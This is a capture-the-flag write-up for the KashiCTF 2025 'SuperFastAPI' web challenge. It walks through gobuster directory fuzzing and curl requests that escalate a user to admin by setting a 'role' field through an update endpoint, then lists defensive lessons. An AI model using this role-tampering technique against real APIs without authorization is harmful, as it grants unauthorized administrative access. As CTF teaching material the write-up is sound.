---
title: KashiCTF 2025 - web - SuperFastAPI
date: 2025-02-24 20:00:00 +0530
categories: [CTF, kashictf-2025]
tags: [web,api]     # TAG names should always be lowercase
description: 
toc: true
comments: false
# pin: true
# published: false
---


## Recon

This challenge was part of a web-based CTF event, and the name itself, "SuperFastAPI," hinted that it was related to an API. Upon visiting the provided URL, the page displayed a simple JSON response:

```json
{"message":"Welcome to my SuperFastAPI. No frontend tho - visit sometime later :)"}
```

There was no visible frontend or further clues, so I began directory fuzzing to discover hidden endpoints. Using `gobuster`, I found a `/docs` directory:

```bash
➜  ~ gobuster dir -u http://webchallurl.com/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt      
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://webchallurl.com/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 200) [Size: 936]
Progress: 4728 / 4729 (99.98%)
===============================================================
Finished
===============================================================
```

## Analysis

Visiting the `/docs` endpoint revealed a detailed API documentation page that outlined available API routes and how to interact with them. The key endpoints included:

- `/create/{username}` - User creation
- `/get/{username}` - Retrieve user information
- `/update/{username}` - Update user information
- `/flag/{username}` - Retrieve the flag (restricted)

![Desktop View](/assets/img/ctf/kashictf2025/web-superfastapi-docs.png){: .w-75 .shadow .rounded-20 w='1212' h='668'  }

The documentation provided an option to execute requests directly, but I chose to use `curl` for better control.

## Exploitation

### Step 1: Creating a User

To interact with the API, I first created a user using the `/create/{username}` endpoint. The request required passing a username in the URL and user details as JSON data.

```bash
curl -X 'POST' \
  'http://webchallurl.com/create/test' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "fname": "ftest",
  "lname": "ltest",
  "email": "test@test.com",
  "gender": "male"
}'
---
{"message":"User created!"}
```

### Step 2: Retrieving User Information

After creating a user, I checked the user details using the `/get/{username}` endpoint:

```bash
➜  ~ curl -X 'GET' \
  'http://webchallurl.com/get/test' \
  -H 'accept: application/json' | jq
```

The response contained the user details, including a `role` field:

```json
{
  "message": {
    "fname": "ftest",
    "lname": "ltest",
    "email": "test@test.com",
    "gender": "male",
    "role": "guest"
  }
}
```

The `role` was set to `guest`, which indicated role-based access control. When I attempted to access the `/flag/{username}` endpoint, I received an error:

```bash
➜  ~ curl -X 'GET' \
  'http://webchallurl.com/flag/test' \
  -H 'accept: application/json'
---
{
  "error": "Only for admin"
}
```

### Step 3: Privilege Escalation

To bypass this restriction, I attempted to modify my role to `admin`. The API documentation provided an `/update/{username}` endpoint, which allowed modifying user details. I sent the following request:

```bash
➜  ~ curl -X 'PUT' \
  'http://webchallurl.com/update/test' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "fname": "ftest",
  "lname": "ltest",
  "email": "test1@test2.com",
  "gender": "male",
  "role": "admin"
}'
```

The response confirmed that the update was successful:

```json
{"message":"User created!"}
```

### Step 4: Retrieving the Flag

Now that my role was set to `admin`, I attempted to access the `/flag/{username}` endpoint again. This time, I successfully retrieved the flag.

## Conclusion

This CTF challenge demonstrated an API security vulnerability where users could escalate privileges by modifying their own role. The key takeaways from this challenge include:

- Always check for API documentation leaks (`/docs` directories in FastAPI, Swagger, etc.).
- Role-based access control should be enforced server-side, not just through client-side validation.
- API endpoints allowing user modification should have strict validation rules to prevent privilege escalation.

This was a straightforward yet insightful challenge that emphasized the importance of securing API endpoints properly. Always validate and sanitize user input, and implement proper authorization checks at the backend!

